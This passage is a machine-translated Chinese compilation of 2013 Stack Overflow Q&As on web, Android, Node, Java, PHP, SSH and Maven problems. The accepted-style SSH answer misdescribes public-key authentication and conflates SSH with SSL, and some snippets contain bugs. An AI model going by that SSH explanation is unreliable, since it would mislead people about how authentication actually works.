          <td style="padding:20px;">
            Body section 2
          </td>
        </tr>
      </table>
<!-- /NEST-->

        </td>
  </tr>
</table>

</td></tr></table></td></tr></table></body></html> 
```

在我的示例中，我使用填充而不是单元格作为间距。

**您永远不需要空白间隔图像。**`&nbsp;`如果您不想使用填充，请在空单元格中使用 a ：

```
 <table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#770000">
    <tr>
      <td height="20" colspan="3">
        &nbsp;
      </td>
    </tr>
    <tr>
      <td width="20">
        &nbsp;
      </td>
      <td width="610">
        header
      </td>
      <td width="20">
        &nbsp;
      </td>
    </tr>
    <tr>
      <td height="20" colspan="3">
        &nbsp;
      </td>
    </tr>
  </table> 
```

附带说明一下，例如，从 Outlook 转发到 Gmail 时，垂直分隔存在一个不可避免的问题（由添加的 mso.normal p 标签提供），但对于初始收件人来说没有问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-02T20:36:46.343

你有大量的空白导致差距：

```
<a href="mms://a1783.v167326.c16732.g.vm.akamaistream.net/7/1783/16732/0/QPS.Onstreammedia.com/origin/jjready2/%5bInbox%5d/Talent%20Management/CDF%201-18_WMV.wmv">
                            <img style="display:block" src="http://emaniocreative.com/eblasts/3_26_2013/Message-from-Dominic-&-Louise.jpg"  width="360" height="257" border="0" alt="Message from Dominic &#38; Louise - Video"></a> 
```

尝试去掉空格..也`display:block`不能像`display:inline-block`（你可能想要的那样）你不能添加格式，例如`margin`or`padding`到`SPAN`. 我会保留你所拥有的`IMG`和`DIV`元素，但是如果你使用的是`TABLE`你可能想要的`border-collapse:collapse;`属性集。

另请注意，如果您正在使用，`display:inline-block`您将需要删除元素之间的*所有*空格：

```
<tr>...</tr><tr>...</tr> 
```

而不是你目前拥有的：

```
<tr>
  ...
</tr>
<tr>
  ...
</tr> 
```

# php - 如何在表单提交中使用 jquery ajax

> ID：15772908
> 
> 赞同：0
> 
> 时间：2013-04-02T19:40:28.180
> 
> 标签：php, jquery, ajax

现在将代码更改为此。表单位于包含在索引页面中的 subscribe.php 中。

```
<form class="subscribe" id="email" method="get">
    <input class="email" id="emailaddress" name="email" type="text" placeholder="EXAMPLE@EMAIL.COM" required>
    <input class="button" type="submit" id="emailSub" value="Subscribe">
</form>
<div id="subResult"></div> 
```

Jquery 在索引页的底部

```
$(document).ready(function() {
    $('#emailSub').click(function() {
        var email = $('#emailaddress').val();
        alert(email);
        $.ajax({
            type: "GET",
            dataType: 'script', //<-Data Type for AJAX Requests(xml | html | script | json)
            url: 'checksub.php',
            data: {
                'e': email
            },
            success: function(result) {
                $("#subResult").html(result);
            }
        });
    })
}); 
```

Checksub 页面现在用于测试。

```
<?php include 'admin/includes/db_connection.php'; ?>
<?php 
$email = mysqli_real_escape_string($db, $_GET['e']);
echo "test string:";
echo $email;
?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:44:50.693

您是否阻止默认点击事件触发提交？

```
$('#emailSub').click(function(e){
    e.preventDefault();
    var email = $('#emailaddress').val();
    $.ajax({url:"checkemail.php?e="+email,success:function(result){
        $("#subResult").html(result);
    }});
}) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-02T20:04:30.613

也许你应该改变数据类型？尝试一下：

```
$.ajax({
    type: "GET",
    dataType: 'html', //<-Data Type for AJAX Requests(xml | html | script | json)
    url: 'checkemail.php',
    data: {
        'e': email
    },
    success: function(data) {
        $("#subResult").html(result);
    }
}); 
```

和

```
<input class="button" type="submit" id="emailSub" value="Subscribe">
                              ^ HERE 
```

应该 ：

```
<input class="button" type="button" id="emailSub" value="Subscribe"> 
```

因为`submit`正在提交表单并刷新页面..所以jquery不起作用..

[指定 AJAX 请求的数据类型](http://docs.jquery.com/Specifying_the_Data_Type_for_AJAX_Requests)

# python - 导入 z3 时出错

> ID：15772909
> 
> 赞同：0
> 
> 时间：2013-04-02T19:40:33.290
> 
> 标签：python, z3

我试图在 pydev 中使用 z3，我将 z3py 和 libz3.dll 的路径添加到 window/preferences/pydev/jython-interpreter，但出现如下错误

Traceback（最近一次调用最后）：文件“C:\Users\linda\workspace\LearningPyDev\main.py”，第 11 行，在 import z3 文件“C:\Users\linda\z3\python\z3.py”中，第 45 行，从 z3printer 导入 * 文件“C:\Users\linda\z3\python\z3printer.py”，第 8 行，在 import sys、io、z3 ImportError：没有名为 io 的模块

io 模块到底是什么？是否可以在 pydev 中运行 z3？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T20:22:18.670

`io`是一个核心 Python 模块。它是在 2.6 中添加的，并且出现在每个后续版本中。您使用的是非常旧的 Python 版本吗？如果您正在运行 Python 2.5 或更早版本（您可以`python --version`在任何命令行中检查），则需要将 Python 更新到较新版本。

# java - 如何使用设置中的 if 语句更改背景颜色？

> ID：15772911
> 
> 赞同：0
> 
> 时间：2013-04-02T19:40:38.813
> 
> 标签：java, android, xml, if-statement, settings

我研究了这个问题，发现需要一个 if 语句。这是 xml 部分 pref_general.xml

```
<ListPreference
    android:defaultValue="Red"
    android:entries="@array/entries"
    android:entryValues="@array/values"
    android:key="example_list1"
    android:title="@string/preferencebackground" /> 
```

你会在java中放置什么来改变背景颜色。例如，如果设置列表首选项颜色 = 黑色，那么`android:background="#000000"` 如果列表首选项颜色 = 绿色……等等。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-03T00:50:05.337

> 你会在java中放置什么来改变背景颜色？

你的意思是如何在运行时设置背景颜色？

如果要更改视图的背景颜色，可以执行

```
View v; // the view you want to change the color...you can findViewById
v.setBackgroundColor(Color.GREEN); 
```

要更改整个活动的颜色，请参阅[如何以编程方式将活动的背景颜色设置为白色？](https://stackoverflow.com/questions/4761686/how-to-set-background-color-of-activity-to-white-programmatically).

或者，如果您想在运行时更改整个主题，请尝试[How to change current Theme at runtime in Android](https://stackoverflow.com/questions/2482848/how-to-change-current-theme-at-runtime-in-android)

# xcode - 试图以编程方式更改 NSArrayController selectIndex，不起作用

> ID：15772917
> 
> 赞同：0
> 
> 时间：2013-04-02T19:40:52.413
> 
> 标签：xcode, cocoa, cocoa-bindings

我有一个关于可可绑定的问题。

我有一个 xib 文件，在这个 xib 文件（名为 AddInformation.xib）中，我添加了一个数组控制器。我已将数组绑定到我的 NSMutableArray 之一。

我还为此阵列控制器设置了一个 IBOutlet，以便我可以操纵阵列控制器的选择

```
@property (weak) IBOutlet NSArrayController *arrayController; 
```

所以，当我打电话时，在代码中的某处：

```
myViewController = [[NSViewController alloc] initWithNibName:@"AddInformation" bundle:nil];

BOOL b = [arrayController setSelectionIndex: 2]; // b is returned as NO 
```

它不起作用，它总是返回数组中的第一个对象，即使我将 selectionindex 更改为 2（我在数组中有超过 10 个对象）

我错过了什么吗？

# javascript - Firefox 异常 'JavaScript 组件没有名为：“可用”的方法'

> ID：15772920
> 
> 赞同：12
> 
> 时间：2013-04-02T19:41:02.637
> 
> 标签：javascript, http, firefox, xmlhttprequest

我正在用 Django 构建一个网络应用程序。我通过 Ajax (jQuery v1.8.3) 在 Javascript 中有一堆 API 调用。

它们中的大多数都可以工作，但一个特定的会导致返回对象的状态为 0，并且此消息作为 statusText：

`[Exception... "'JavaScript component does not have a method named: "available"' when calling method: [nsIInputStream::available]" nsresult: "0x80570030 (NS_ERROR_XPC_JSOBJECT_HAS_NO_FUNCTION_NAMED)" location: "JS frame :: http://127.0.0.1:8000/media/js/jquery.js :: .send :: line 8434" data: no]`

jQuery中对应的行是`xhr.send( ( s.hasContent && s.data ) || null );`

但是，这只发生在 Firefox 中。铬工作正常。同样，其他请求确实有效。唯一让这个与众不同的是 DELETE http 方法。

请求如下（Chrome 中显示的 HTTP 网络数据 - Firebug 在 Firefox 中不显示任何内容）：

```
Request URL: http://127.0.0.1:8000/api/reservation/13/
Request Method: DELETE
Status Code: 400 BAD REQUEST    (This is expected)

Request Headers
Accept: application/json, text/javascript, */*; q=0.01
Content-Length: 15
Content-Type: application/json
Origin: http://127.0.0.1:8000
Referer: http://127.0.0.1:8000/reservation/
X-Requested-With: XMLHttpRequest

Request Payload
[object Object]

Response Headers
Cache-Control: no-cache
Content-Type: text/html; charset=utf-8
Date: Tue, 02 Apr 2013 19:18:35 GMT
Server: WSGIServer/0.1 Python/2.7.2 
```

在服务器上，我没有收到任何请求。

JS 代码是（在断点处直接取自 Firebug Watch）：

```
options = {
    contentType: "application/json",
    data: Object {},
    dataType: "json",
    processData: false,
    type: "DELETE",
    url: "/api/reservation/13/",
    error: function(),
    success: function()
};
$.ajax(options); 
```

我也确实尝试禁用 FF 中的所有扩展。我运行 v20.0。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2013-04-05T22:05:50.200

问题是 Firefox 与 jQuery/XMLHttpRequest 的组合并通过 HTTP DELETE**发送对象。**一旦 JSON'ifying 对象通过`JSON.stringify()`一切工作。

尽管如此，Firefox 还是会抛出一个奇怪的异常。

感谢 freddyb 的这个想法。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-07-23T07:13:31.080

问题出`processData`在`$.ajax`函数内调用的属性上。当这个属性被提供为“false”（不知道为什么）时，Firefox 不喜欢它，因此，浏览器不会消化 JSON 请求/响应包。Chrome 和 Safari 运行良好。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-09-24T01:33:08.907

`GET`当***请求*** `data`对象为空对象时（如`{}`. 我正在使用`Mithril.js`，它可能与 Mithril 总是为非`GET`请求设置 Content-Type 的事实有关。一旦我知道触发器，这绝对是可重复的。

（请注意，“非`GET`”部分可能并不完全准确——Mithril 会忽略数据对象，`GET`因此使用底层 AJAX 对象发送带有 GET 的空对象也可能以同样的方式失败。）

与直觉相反，设置`data`为空字符串 ,`""`不会以这种方式失败，所以这是我的解决方法。实际上，当没有数据时，我根本不设置数据，如果在我发送请求时（在我的 AJAX 包装器中）未设置，我将其默认为`""`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-03T04:43:57.540

听起来您安装了一个有问题的 Firefox 扩展程序，它试图检查 XMLHttpRequest 数据并且失败了......

我建议您尝试[http://support.mozilla.org/en-US/kb/troubleshoot-firefox-issues-using-safe-mode](http://support.mozilla.org/en-US/kb/troubleshoot-firefox-issues-using-safe-mode)或者只是禁用任何涉及的 Firefox 扩展。

# node.js - 编码在 fs.readFile 中被忽略

> ID：15772925
> 
> 赞同：24
> 
> 时间：2013-04-02T19:41:15.050
> 
> 标签：node.js

我正在尝试读取节点中属性文件的内容。这是我的电话：

```
fs.readFile("server/config.properties", {encoding: 'utf8'}, function(err, data ) {
   console.log( data );
}); 
```

控制台打印一个缓冲区：

```
<Buffer 74 69 74 69 20 3d 20 74 6f 74 6f 0a 74 61 74 61 20 3d 20 74 75 74 75> 
```

当我用这个替换代码时：

```
fs.readFile("server/config.properties", function(err, data ) {
   console.log( data.toString('utf8') );
}); 
```

它工作正常。但是[节点文档](http://nodejs.org/api/fs.html#fs_fs_readfile_filename_options_callback)说如果在选项中传递编码，则字符串将转换为 utf8

node --version 的输出是 v0.10.2

我在这里想念什么？

谢谢您的支持

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2013-04-02T20:29:47.387

根据您运行的 Node 版本，参数可能只是`encoding`：

```
fs.readFile("server/config.properties", 'utf8', function(err, data ) {
   console.log( data );
}); 
```

第二个参数更改为`options` [v0.10](https://github.com/joyent/node/wiki/Api-changes-between-v0.8-and-v0.10)：

> *   FS `readFile()`, `writeFile()`,`appendFile()`和它们的 Sync 对应物现在接受一个`options`对象（但`encoding`仍然支持旧的 API，一个字符串）

对于以前的文档：

*   [v0.8.22](http://nodejs.org/docs/v0.8.22/api/fs.html#fs_fs_readfile_filename_encoding_callback)
*   [v0.6.21](http://nodejs.org/docs/v0.6.21/api/fs.html#fs_fs_readfile_filename_encoding_callback)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2014-11-18T10:02:47.123

您应该更改`{encoding: 'utf8'}`为 {encoding: 'utf-8'}，例如：

```
fs.readFile("server/config.properties", {encoding: 'utf-8'}, function(err, data ) {
console.log( data );
}); 
```

# java - java中的自定义绘制函数

> ID：15772930
> 
> 赞同：-1
> 
> 时间：2013-04-02T19:41:24.003
> 
> 标签：java, swing, jframe, jpanel, java-2d

我是java的新手。我正在做一个任务，我正在从文件中读取命令并在 jpanel 上绘制形状。文件就像

```
 FRAME 200 100        // open a frame, note: parser must ignore any comments
    COLOR 255 0 0 // set color to red
    RECTANGLE 20 30 40 20 // draw a red rectangle
    COLOR 128 128 128 // set color to gray
    CIRCLE 100 50 25 // draw a gray circle
    FRAME 100 100    // open a second frame
    COLOR 0 0 255 // set color to blue
    ELLIPSE 50 50 30 20 // draw a blue ellipse
    COLOR 0 255 0 // set color to green
    LINE 10 20 90 80 // draw a green line 
```

我写了以下代码。

```
JFrame frame = new JFrame("JFrame Source Demo");
frame.setTitle("Drawing Graphics in Frames");
frame.setBounds(100,50,500,300);
frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
frame.setVisible(true);
///////////////////
    File file = new File("Paint_instruction.txt");  
    //  Get data from this file using a file reader.   
    FileReader fr = new FileReader(file);  
    // To store the contents read via File Reader  
    BufferedReader br = new BufferedReader(fr);
    //writer to write in file

    while((data = br.readLine()) != null)   
    { 
        /*String[] tokens = data.split("\\s{1,}");
           for(int i=0;i<tokens.length;i++)
           {System.out.println(tokens[i]);}*/

         String []tokens = data.split("\\s{1,}");

           if(tokens[0].equals("FRAME"))
           {JFrame frame2 = new JFrame("JFrame Source Demo");
           frame2.setBounds(0, 0, 40, 40);
           frame2.setVisible(true);

           }
           else if(tokens[0].equals("RECTANGLE"))
           {
           //draw circle
           }
           else if(tokens[0].equals("CIRCLE"))
           {
               //draw circle
           }
           else if(tokens[0].equals("LINE"))
           {
               //draw Line
           }
           else if(tokens[0].equals("ELLIPSE"))
           {
               //draw ELLIPSE
           } 
```

我不知道如何使用绘画功能来绘制这些形状。我试图将数组传递给绘画函数。但它没有用。我已经护目镜，但没有找到任何适当的帮助

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-02T19:45:49.823

> 并在 jpanel 上绘制形状。

那么你的 JPanel 在哪里呢？

> 我已经护目镜，但没有找到任何适当的帮助

我觉得很难相信。在这个论坛和其他论坛上都可以找到[自定义绘画](http://docs.oracle.com/javase/tutorial/uiswing/painting/index.html)教程的链接。

从文件中读取命令时，学习如何进行绘画比较困难，因此我建议您在从命令文件中处理绘画之前先学习绘画的基础知识。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:46:22.547

您应该覆盖`paintComponent`方法，并在该方法内使用传入方法的参数`JPanel`绘制所有这些形状。并将其添加到. 看[官方](http://docs.oracle.com/javase/tutorial/uiswing/painting/closer.html)的java绘图机制教程`java.awt.Graphics``paintComponent``JPanel``JFrame`

# php - Android 中的 JSON/PHP 数据限制

> ID：15772932
> 
> 赞同：0
> 
> 时间：2013-04-02T19:41:27.947
> 
> 标签：php, android, json

日志我有一个可用的 Android 应用程序，它使用 JSON 将以下详细信息发送到 PHP 网络服务器

```
"PhoneNumber"
"ContactName"
"CallType"
"CallDate"
"CallDuration" 
```

我的应用程序可以很好地获取所有这些细节，并且 php 网络服务器也能够解析并将其放入数据库中。

php解析：

```
foreach ( $json_output->CallDetails as $contact )
{
    $phonenum = $contact->PhoneNumber;
    $contactnum = $contact->ContactName;
    $calltype = $contact->CallType;
    $calldate = $contact->CallDate;
    $callduration = $contact->CallDuration;
    // Insert into database 
} 
```

当我尝试将 10 个联系方式从手机发送到网络服务器时，一切正常。但是，如果我尝试发送整个电话日志（您可以猜到它可能非常大 3），那么数据库中不会添加任何内容。

因此，我假设我违反了 JSON 发送端限制或 PHP 接收端限制的一些限制。有谁知道它是什么？

有人可以建议一个解决方法。我真的不想以更小尺寸的短脉冲发送我的 JSON 数据。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T20:29:44.730

很可能，通过 POST 发送的数据太大，服务器无法处理。您需要通过将其添加到您的`php.ini`或`.htaccess`文件来增加最大帖子大小。

*.htaccess 示例：*

```
php_value upload_max_filesize 20M
php_value post_max_size       20M 
```

**更新：** 在检查您的 后`phpinfo`，您当前的服务提供商似乎`post_max_size`将`8M`.

# security - 使用公钥和私钥进行 SSH 通信

> ID：15772937
> 
> 赞同：1
> 
> 时间：2013-04-02T19:41:45.103
> 
> 标签：security, unix, ssh, public-key-encryption, openssh

我正在尝试了解 SSH 授权方法的工作原理，因为我正在尝试使用 gitolite 设置 git 服务器。

据我所知，gitolite 将使用 ssh 来授权用户并授予他们对具有个人读写权限的特定存储库的访问权限。但我对授权的工作方式感到困惑。

我在 YouTube 上看过一些视频，他们使用颜色进行类比来解释。如果我理解正确，对于要以秘密方式相互通信的两个人来说，他们需要一个秘密和公钥。

两个人彼此知道公钥，并且为了在彼此之间进行通信，他们同意使用一个公钥。为了建立连接，他们使用相同的公钥加密他们的私钥并将结果发送给对方。当他们收到结果时，他们将私钥添加到该消息中，并且像魔术一样，他们得到了相同的消息。

但我认为我不理解这一点，因为我看不到服务器将如何验证客户端。我知道服务器必须保存将连接到他的客户端的公钥，但他也有私钥？

当客户端尝试连接到服务器时，他发送用他的公钥加密的私钥，服务器使用客户端公钥加密他的私钥并发送给客户端？

服务器如何检查用户是否真的是他？我还读到要解密用公钥加密的信息，只有持有私钥的人才能解密消息。那么如果没有客户端私钥，服务器如何解密客户端发送的消息呢？

如果有人可以向我解释如何使用此公钥和私钥进行身份验证、授权和信息交换，我将非常高兴。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-02T20:10:43.510

SSH 的工作原理大致如下。请注意，这只是一个高级解释：

每一方都有两个密钥：公钥和私钥。公钥/私钥在数学上是相关的，因此它们在功能上是相反的。因此，一个人执行的操作只能由另一个人完全撤消。它很复杂，但可以把它想象成计算 x^nnn 与 x 的 nnnth 根。前者很容易，但后者很困难，因此在计算上难以以足够的准确度猜测以撤消操作。这为我们提供了一些理想的属性，允许 SSH 对它们执行以下操作：

客户端连接到服务器。服务器通过提供使用其私钥签名的证书来证明其身份。客户端使用服务器的公钥解密证书，并且知道只有客户端可以加密它，因为它需要私钥。然后服务器对客户端提供的证书执行相同的操作。识别只能在 100% 保证的情况下使用受信任的第三方来管理公钥。在没有第三方的情况下，只能检测到身份更改。

现在身份已验证，服务器生成一个对称密钥，使用客户端的公钥对其进行加密，然后将其发送给客户端（客户端是唯一可以解密消息的人，因为它需要私钥）。从此时起，客户端和服务器都拥有对称密钥，所有通信都使用此密钥加密。这样做是出于性能原因，因为对称加密操作比非对称操作快大约 100 倍。

这就是 SSL 验证身份和加密信息的方式。请注意，更精细的访问控制由更高级别的应用程序（例如 *nix 文件权限）提供，而不是 SSL。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:47:03.947

对于 Stackoverflow 格式，对这个主题的解释有点过分。

几天前，Coursera 开设了一个关于密码学的免费课程（第一部分），它准确地解释了你感兴趣的问题。

我欢迎您参加[密码学课程](https://www.coursera.org/course/crypto)以找到您问题的答案

# c# - 将自动完成组合框添加到 RadRichTextBox (Telerik)

> ID：15772938
> 
> 赞同：2
> 
> 时间：2013-04-02T19:41:49.740
> 
> 标签：c#, .net, silverlight, telerik

我需要添加一个具有功能的 ComboBox，例如 Visual Studio intellisense 的自动完成功能来写一个单词。目前我有一个跨度，我需要将其转换为如图所示的组合框： ![在此处输入图像描述](https://i.stack.imgur.com/mkstP.png)

富文本框是 Telerik 的控件 ( [http://www.telerik.com/help/silverlight/radrichtextbox-overview.html](http://www.telerik.com/help/silverlight/radrichtextbox-overview.html) )

# api - 在流星应用程序中发布推文

> ID：15772951
> 
> 赞同：3
> 
> 时间：2013-04-02T19:42:22.560
> 
> 标签：api, twitter, meteor

我正在尝试使用 Meteor 构建一个应用程序，该应用程序涉及用户使用 twitter、facebook 或 google+ 登录，然后从应用程序内发布到这些帐户。

首先，我试图让 Twitter 正常工作。我有我的推特登录工作，允许代表他们发推文工作，但我如何实际发送推文？

我想我需要这个：[https](https://dev.twitter.com/docs/api/1.1/post/statuses/update) ://dev.twitter.com/docs/api/1.1/post/statuses/update但我无法弄清楚身份验证如何与 Meteor 一起工作。

有什么例子可以帮助我吗？还是教程？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:59:46.093

你需要一个 API 来帮助你，除非你想手动使用 REST 和`Meteor.http`. 我建议你得到陨石：[https ://github.com/oortcloud/meteorite](https://github.com/oortcloud/meteorite)

它像节点模块一样安装，通过`npm install -g meteorite`

Meteorite 是meteorite 的包装器，可让您在[http://atmosphere.meteor.com上使用社区包](http://atmosphere.meteor.com)

您可以使用的 twitter 包`twitter-api`通过以下方式安装`mrt add twitter-api`：[https ://github.com/Sewdn/meteor-twitter-api](https://github.com/Sewdn/meteor-twitter-api)

使用服务器 api 添加后，您可以通过以下方式添加推文：

**服务器 JS**

```
var twitter = new Twitter();

Meteor.methods({
    postTweet: function (text) {
        if(Meteor.user())
          twitter.postTweet(text),
          return true;
    }
}); 
```

**客户端JS**

```
//Use this in your click handler where you want to post a tweet:

Meteor.call("postTweet", "This is Twweeeeeetttt!", function(err,result) {
    if(!err) {
        alert("Tweet posted");
    }
}); 
```

该 api 负责处理用户的 oauth 令牌，因此您不必太担心

# download - phpstorm远程主机（SFTP）自动下载

> ID：15772953
> 
> 赞同：2
> 
> 时间：2013-04-02T19:42:24.130
> 
> 标签：download, sftp, phpstorm, automatic-updates

我只是将一个新的远程项目添加到我的 phpstorm 工作区。如果我更改一些代码，它将自动上传到我的服务器（sftp）。但是当那里发生变化时，我的 IDE 什么都没有发生……有解决方案吗？phpstorm V.6.0。

非常感谢您的帮助。ps：不幸的是，我无法将模式更改为 svn 或任何其他颠覆；）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-03T04:44:19.903

此功能尚不可用，请按照此请求：

*   [WI-1284](http://youtrack.jetbrains.com/issue/WI-1284)远程文件自动刷新

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-11T19:43:21.520

就个人而言，我已经用宏替换了“保存”键映射。

该宏确实包括我需要的“自动下载”（文件夹）。（从远程开发堆栈到有我的仓库的本地开发机器。）

（除了我想“自动”发生的其他步骤。）

# colors - 创建一个假调色板并将像素值与其关联

> ID：15772954
> 
> 赞同：1
> 
> 时间：2013-04-02T19:42:24.150
> 
> 标签：colors, qt4, pyqt, color-palette

我有来自红外相机的原始像素数据（640x480 像素），代表特定的测量温度。这些像素值的范围为 0 到 65535 的 16 位。

我可以将像素值显示为 8 位灰度，效果很好。

但现在我想通过使用假调色板来显示这些像素。

我注意到这里有两个挑战：
1.) 创建一个假调色板。这意味着不仅仅是一个简单的 RGB 或 HSV 调色板......我正在考虑从黑色到黄色，到橙色，到红色，最后到紫色的过渡
2.）将像素值与我调色板上的颜色相关联（例如 0 =黑色，65535 = 紫色，但 31521 = ???)

你知道我应该如何解决这个问题吗？我使用 Qt4 和 Python (PyQt)，但如果您只是分享解决方案的方式，我会非常高兴。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:47:41.053

一种简单的方法是在您的范围内的某些点定义颜色 - 如在您的示例中，0 是黑色，65535 是紫色，也许 10000 是红色，无论您想做什么。使用这些关键 rgb 值设置一个表，然后简单地在输入值上方和下方的关键值的 rgb 值之间进行插值，以找到任何给定值的 rgb 颜色。

例如。如果您正在查找值 1000 的颜色，并且您的表有

```
value=0, color=(0,0,0)
value=5000, color=(255, 0, 255) 
```

然后您将在这些值之间进行插值以获得颜色 (51, 0, 51)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:51:00.443

最简单的方法如下：将 unsigned short 转换为一个`QRgb`类型，并在 QColor 构造函数中使用它。

```
unsigned short my_temp=...;
QColor my_clr((QRgb)my_temp); 
```

这将使您的值介于黑色和青色之间。

# javascript - Mousemove 不在服务器上循环——但在 jsbin 中有效

> ID：15772957
> 
> 赞同：2
> 
> 时间：2013-04-02T19:42:29.157
> 
> 标签：javascript, jquery, loops, mousemove

这可能是一个一般的 javascript 问题，但它让我发疯。我有一个函数可以在 mousemove 事件中检测 pageX 和 pageY，并将它们分配给 css 渐变。

```
$(function(){
    var mouseX = 0, mouseY = 0;
    $(document).mousemove(function(e){
        mouseX = e.pageX;
        mouseY = e.pageY; 
    });

    // cache the selector
    var follower = $("#follower");
    var xp = 0, yp = 0;
    var loop = setInterval(function(){
        // change 12 to alter damping higher is slower
        xp += (mouseX - xp) / 12;
        yp += (mouseY - yp) / 12;
        follower.css({
            background : '-webkit-radial-gradient('+xp+' '+yp+', ellipse cover,  rgba(12,47,63,0) 0%,rgba(10,37,49,1) 27%,rgba(5,10,10,1) 100%)'
        });

    }, 30);
}); 
```

真正让我抓狂的是它可以在 jsbin 上运行：

[http://jsbin.com/owuxep/3/edit](http://jsbin.com/owuxep/3/edit)

但不在我的服务器（甚至桌面）上。任何帮助将不胜感激。

[http://paulclarkphoto.com/mouseFollow/``](http://paulclarkphoto.com/mouseFollow/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T20:11:20.297

在 CSS 字符串中的值之后添加 'px' 可以在 Chrome 中为我修复它。

```
background: '-webkit-radial-gradient('+xp+'px '+yp+'px, ellipse cover,  rgba(12,47,63,0) 0%,rgba(10,37,49,1) 27%,rgba(5,10,10,1) 100%)' 
```

奇怪的是它可以在 JS Bin 上运行……</p>

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:55:12.937

如何在页面中包含脚本？执行 javascript 时，DOM 中可能还不存在“#follower”元素。尝试在定义元素后或加载 DOM 后包含脚本（即使用 jQuery: `$(document).ready(HERE_SOMEHOW)`）

# java - 如何将依赖项从本地存储库复制到某个特定位置？

> ID：15772958
> 
> 赞同：0
> 
> 时间：2013-04-02T19:42:31.637
> 
> 标签：java, maven, jdeveloper

我想将所有依赖项从本地存储库复制到某个特定位置，而不必指定应该复制哪些依赖项，我只想复制我在特定文件夹中的 pom 中声明的所有依赖项。

[http://pastebin.com/3neyQJyp](http://pastebin.com/3neyQJyp)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T20:15:41.660

包含的 pom 生成这些文件：

```
d:\temp\copy-dependencies>dir target /s/b
d:\temp\copy-dependencies\target\librerias
d:\temp\copy-dependencies\target\librerias\aopalliance-1.0.jar
d:\temp\copy-dependencies\target\librerias\commons-logging-1.1.1.jar
d:\temp\copy-dependencies\target\librerias\servlet-api-2.5.jar
d:\temp\copy-dependencies\target\librerias\spring-aop-3.1.3.RELEASE.jar
d:\temp\copy-dependencies\target\librerias\spring-asm-3.1.3.RELEASE.jar
d:\temp\copy-dependencies\target\librerias\spring-beans-3.1.3.RELEASE.jar
d:\temp\copy-dependencies\target\librerias\spring-context-3.1.3.RELEASE.jar
d:\temp\copy-dependencies\target\librerias\spring-context-support-3.1.3.RELEASE.jar
d:\temp\copy-dependencies\target\librerias\spring-core-3.1.3.RELEASE.jar
d:\temp\copy-dependencies\target\librerias\spring-expression-3.1.3.RELEASE.jar
d:\temp\copy-dependencies\target\librerias\spring-web-3.1.3.RELEASE.jar
d:\temp\copy-dependencies\target\librerias\spring-webmvc-3.1.3.RELEASE.jar 
```

### pom.xml

```
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>temp</groupId>
    <artifactId>temp</artifactId>
    <version>0.0.1-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>servlet-api</artifactId>
            <version>2.5</version>
            <scope>provided</scope>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-webmvc</artifactId>
            <version>3.1.3.RELEASE</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-dependency-plugin</artifactId>
                <executions>
                    <execution>
                        <id>copy-dependencies</id>
                        <phase>compile</phase>
                        <goals>
                            <goal>copy-dependencies</goal>
                        </goals>
                        <configuration>                      
                            <outputDirectory>${project.build.directory}/librerias</outputDirectory>
                        </configuration>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>

</project> 
```

# jquery - Asp.net MVC with Entity，使用 jquery 将数据传递到 List。不工作

> ID：15772964
> 
> 赞同：4
> 
> 时间：2013-04-02T19:42:42.310
> 
> 标签：jquery, asp.net, asp.net-mvc, razor, editortemplates

**编辑 3 / 最终**

这是使用 .NET MVC、Jquery 和编辑器模板的完整示例。 [https://www.dropbox.com/s/t4yxbhkuowyd7va/exerciseTest.rar](https://www.dropbox.com/s/t4yxbhkuowyd7va/exerciseTest.rar)

**编辑 2**

它终于奏效了！感谢下面的答案。看来我需要更改 NewAnswerRow 部分行：

```
<input type='text' id='Answers_@(Model.AnswerId)__Answer'   name='Answers[@Model.AnswerId].Answer'/> 
```

谢谢 ！

**编辑1：**

我遵循了本指南： [http ://www.techiesweb.net/asp-net-mvc3-dynamically-added-form-fields-model-binding/](http://www.techiesweb.net/asp-net-mvc3-dynamically-added-form-fields-model-binding/)

有趣的是，当我使用他的资源时，它的工作原理应该是这样。但它几乎完全一样。

**原帖**

